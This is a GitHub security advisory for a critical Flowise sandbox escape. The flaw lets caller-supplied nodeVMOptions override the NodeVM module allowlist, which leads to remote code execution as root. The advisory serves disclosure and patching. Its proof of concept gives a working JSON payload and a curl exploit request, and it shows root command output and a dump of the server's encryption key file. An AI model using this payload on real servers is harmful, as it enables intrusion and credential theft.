# [C] Flowise: RCE via NodeVM Sandbox Escape in executeJavaScriptCode() nodeVMOptions Override

## Summary
Severity: Critical
Advisory: GHSA-3769-jgqc-cxm7
CVE: CVE-2026-69254
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-08-04
Source: https://github.com/advisories/GHSA-3769-jgqc-cxm7
Type: github-advisory

## Affected
- npm: `flowise` — affected >=0 <3.1.3
- npm: `flowise-components` — affected >=0 <3.1.3

## Details
### Summary
A sandbox escape vulnerability in `executeJavaScriptCode()` allows any authenticated user to execute arbitrary system commands as root on the Flowise server. The function accepts caller-provided `nodeVMOptions` that override the
  default sandbox security settings via JavaScript's spread operator, allowing an attacker to re-enable blocked modules like `child_process` and `fs`.

### Details
The vulnerability is in `packages/components/src/utils.ts` at line 1755:

  ```typescript
  const finalNodeVMOptions = { ...defaultNodeVMOptions, ...nodeVMOptions }

  The executeJavaScriptCode() function (line 1569) creates a NodeVM sandbox with secure defaults that restrict which Node.js built-in modules can be required:

  async (code, sandbox, options = {}) => {
      const { nodeVMOptions = {} } = options;
      // ...
      const defaultNodeVMOptions = {
          require: {
              builtin: builtinDeps,  // restricted allowlist — blocks child_process, fs, os, etc.
              mock: secureWrappers
          },
          eval: false,
          wasm: false
      }
      const finalNodeVMOptions = { ...defaultNodeVMOptions, ...nodeVMOptions }  // ← VULN: caller overrides security settings
      const vm = new NodeVM(finalNodeVMOptions)
  }
```
The spread operator allows any caller to override require.builtin with ["*"], which permits all Node.js built-in modules including child_process.


**Taint 01: Route Registration**                                                                                                                                                                                                           
  `packages/server/src/routes/node-custom-functions/index.ts` (line 8)                                                                                                                                                                       
                                                                                                                                                                                                                                             
  **Taint 02: Controller**                                                                                                                                                                                                                   
  `executeCustomFunction()` passes `req.body` to service — `packages/server/src/controllers/nodes/index.ts` (line 90)                                                                                                                        
                                                                                                                                                                                                                                             
  **Taint 03: Service**
  `executeCustomNodeFunction()` loads the `customFunction` node and calls `init()` with user-provided `javascriptFunction` — `packages/server/src/utils/executeCustomNodeFunction.ts` (line 49)
                                                                                                                                                                                                                                             
  **Taint 04: Sandbox Entry**                                                                                                                                                                                                                
  Code runs inside NodeVM via `executeJavaScriptCode()` — `packages/components/src/utils.ts` (line 1760)                                                                                                                                     
                                                                                                                                                                                                                                             
  **Taint 05: Escape**
  Inside the sandbox, the attacker requires `flowise-components/dist/src/utils.js` by absolute path (bypassing the module allowlist), obtaining a reference to `executeJavaScriptCode()` itself
                                                                                                                                                                                                                                             
  **Taint 06: Override**
  The attacker calls `executeJavaScriptCode()` with `nodeVMOptions: { require: { builtin: ["*"] } }`, which overrides the security defaults at line 1755: `{ ...defaultNodeVMOptions, ...nodeVMOptions }`                                    
                                                                                                                                                                                                                                             
  **Taint 07: RCE**                                                                                                                                                                                                                          
  Inside the nested VM, `require("child_process")` succeeds. Arbitrary commands execute as root.                                                                                                                                             





### PoC
  **Step 1: Start Flowise**                                                                                                                                                                                                                  
                  
  ```bash
  docker run -d --name flowise-poc -p 3000:3000 \
    -e PORT=3000 -e DISABLE_FLOWISE_TELEMETRY=true \                                                                                                                                                                                         
    flowiseai/flowise:latest                                                                                                                                                                                                                 
                                                                                                                                                                                                                                             
  # Wait ~30s for startup                                                                                                                                                                                                                    
  curl http://localhost:3000/api/v1/version
  # {"version":"3.1.1"}                                                                                                                                                                                                                      
  ```             
                                                                                                                                                                                                                                             
  **Step 2: Obtain Bearer Token**

  Register an account, then create an API key:                                                                                                                                                                                               
   
  ```bash                                                                                                                                                                                                                                    
  # Register      
  curl -s -X POST http://localhost:3000/api/v1/account/register \
    -H "Content-Type: application/json" \
    -d '{"user":{"email":"attacker@test.com","password":"Attack12345","name":"Attacker"}}'                                                                                                                                                   
                                                                                                                                                                                                                                             
  # Create API key (via the UI at http://localhost:3000 → Settings → API Keys → Create)                                                                                                                                                      
  # Copy the key — this is the Bearer token used below.                                                                                                                                                                                      
  ```                                                                                                                                                                                                                                        
                  
  **Step 3: Create Payload**                                                                                                                                                                                                                 
                  
  ```bash
  cat > exploit.json << 'EOF'
  {
    "javascriptFunction": "const utils = require('/usr/local/lib/node_modules/flowise/node_modules/flowise-components/dist/src/utils.js'); const code = 'const cp = require(\"child_process\"); cp.execSync(\"id > /tmp/RCE-PROOF.txt\");    
  return cp.execSync(\"id\").toString()'; return await utils.executeJavaScriptCode(code, {}, { nodeVMOptions: { require: { builtin: [\"*\"] } } })"                                                                                          
  }                                                                                                                                                                                                                                          
  EOF                                                                                                                                                                                                                                        
  ```             

  **Step 4: Exploit**

  ```bash
  # Pre-check: file does not exist
  docker exec flowise-poc ls -l /tmp/RCE-PROOF.txt                                                                                                                                                                                           
  # ls: /tmp/RCE-PROOF.txt: No such file or directory                                                                                                                                                                                        
                                                                                                                                                                                                                                             
  # Execute                                                                                                                                                                                                                                  
  curl -X POST http://localhost:3000/api/v1/node-custom-function \
    -H "Content-Type: application/json" \                                                                                                                                                                                                    
    -H "Authorization: Bearer <TOKEN>" \
    -d @exploit.json                                                                                                                                                                                                                         
  # "uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)...\n"                                                                                                                                                             
                                                                                                                                                                                                                                             
  docker exec flowise-poc ls -l /tmp/RCE-PROOF.txt                                                                                                                                                                                           
  # -rw-r--r--  1 root  root  138 Apr  2 05:02 /tmp/RCE-PROOF.txt                                                                                                                                                                            
                                                                                                                                                                                                                                             
  docker exec flowise-poc cat /tmp/RCE-PROOF.txt                                                                                                                                                                                             
  # uid=0(root) gid=0(root) groups=0(root)...                                                                                                                                                                                                
                                                                                                                                                                                                                                             
  docker exec flowise-poc cat /root/.flowise/encryption.key
  # GI6doXdDjU0JTxgUsUoft5E+A0TS9qFb                                                                                                                                                                                                         
  ```                                                                                                                                                                                                                                        
<img width="1919" height="1033" alt="image" src="https://github.com/user-attachments/assets/3a2473f0-75a7-4c01-8c9d-9c758cf957fc" />


### Impact
Full remote code execution as root. Any authenticated user with a valid API key can execute arbitrary system commands on the host, read any file on the filesystem including the encryption key at `/root/.flowise/encryption.key` (which  
  decrypts every stored credential - API keys, OAuth tokens, database passwords) and the JWT signing secret at `/root/.flowise/jwt_auth_token_secret.key` (which allows forging authentication tokens for any user), and establish persistent
   access via cron jobs or reverse shells. All Flowise deployments running >= 3.0.5 through 3.1.1 (latest) are affected.

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3769-jgqc-cxm7
- https://github.com/FlowiseAI/Flowise/pull/6306
- https://github.com/FlowiseAI/Flowise/commit/3086cb7e323bb96c5a581d3232ef975b0d92183d
- https://github.com/FlowiseAI/Flowise
- https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3
